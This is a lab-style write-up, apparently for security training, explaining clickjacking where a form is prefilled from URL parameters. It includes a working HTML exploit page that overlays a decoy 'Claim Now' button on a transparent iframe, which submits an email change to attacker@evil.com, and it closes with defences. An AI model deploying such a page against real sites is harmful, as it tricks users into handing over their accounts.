# Clickjacking with form input data prefilled from a URL parameter

### Goal -

Exploit a clickjacking vulnerability where form fields can be prefilled from URL parameters, allowing the attacker to pre-fill malicious values and trick the user into submitting them.

### Vulnerability / Concept

The application allows form fields to be prefilled via URL parameters (e.g., `?email=attacker@evil.com`). Combined with the lack of frame-busting (`X-Frame-Options`), this allows the attacker to pre-fill the form with malicious data and trick the user into submitting it by clicking on a seemingly harmless button.

### Exploitation

1. Identify URL parameters that pre-fill form fields on the target page
2. Create an HTML page with a transparent iframe pointing to the target URL with pre-filled malicious values
3. Overlay deceptive UI elements (e.g., a fake "Click here for a prize" button) on top of the invisible form submit button
4. When the user clicks the deceptive button, they actually click the form's submit button in the iframe
5. The form submits with the attacker-controlled pre-filled values

Example exploit page:
```html
<style>
    iframe {
        position: relative;
        width: 500px;
        height: 300px;
        opacity: 0.1;
        z-index: 2;
    }
    .decoy {
        position: absolute;
        top: 50px;
        left: 50px;
        z-index: 1;
    }
</style>
<div class="decoy">
    <h3>Click here for a free gift!</h3>
    <button>Claim Now</button>
</div>
<iframe src="https://TARGET.net/update-email?email=attacker@evil.com"></iframe>
```

### Why It Works

The application accepts URL parameters to pre-fill form data (a convenience feature). Combined with the lack of `X-Frame-Options` or `frame-ancestors` CSP, the attacker can frame the page with pre-filled malicious values. The user's click on the deceptive button is captured by the transparent iframe, submitting the form with the attacker-controlled data (e.g., changing the victim's email to an attacker-controlled address).

### Key Takeaways

- Do not allow form pre-filling from URL parameters for sensitive forms
- Set `X-Frame-Options: DENY` or `SAMEORIGIN`
- Use CSP `frame-ancestors 'none'` or `frame-ancestors 'self'`
- Validate form data server-side regardless of how it was entered
- Use CSRF tokens that are tied to the form's initial state
